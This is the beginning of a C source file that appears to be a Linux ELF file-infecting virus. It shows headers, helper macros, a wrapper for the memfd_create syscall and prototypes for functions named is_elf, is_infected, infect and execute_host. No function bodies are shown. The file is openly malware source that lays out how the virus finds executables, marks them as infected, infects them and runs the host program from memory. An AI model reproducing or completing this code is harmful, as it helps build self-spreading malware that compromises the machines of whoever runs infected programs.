#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/unistd.h>
#include <sys/ptrace.h>
#include <dlfcn.h>
#include <elf.h>

//compiler attribute macros
#define ALWAYS_INLINE __attribute__((always_inline))
#define OPTIMIZE(x) __attribute__((optimize(x)))

//boolean logic macros
#define BOOL int
#define TRUE 1
#define FALSE 0

//memfd_create syscall wrapper macro
#define MEMFD_CREATE(x,y) syscall(__NR_memfd_create, x, y)

//externally reference to  environment variable 
extern char** environ;

//declared function prototypes
ALWAYS_INLINE OPTIMIZE(3) static inline long elf_size(FILE*);
ALWAYS_INLINE OPTIMIZE(3) static inline BOOL is_elf(char*);
ALWAYS_INLINE OPTIMIZE(3) static inline BOOL is_infected(char*);
ALWAYS_INLINE OPTIMIZE(3) static inline void infect(FILE*, FILE*);
ALWAYS_INLINE OPTIMIZE(3) static inline void execute_host(FILE*, char**, char**);
